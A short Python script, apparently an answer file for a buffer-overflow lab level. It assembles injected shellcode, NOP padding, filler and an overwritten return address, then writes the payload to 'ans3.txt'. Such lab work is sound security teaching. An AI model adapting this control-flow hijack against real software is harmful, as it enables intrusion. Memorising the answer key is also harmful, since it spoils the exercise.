sc = b"\xbf\x72\x00\x00\x00\x68\x16\x12\x40\x00\xc3"
payload = sc + b"\x90" * (0x20 - len(sc)) + b"B" * 8 + (0x401334).to_bytes(8, "little") + b"C" * 0x10
open("ans3.txt", "wb").write(payload)
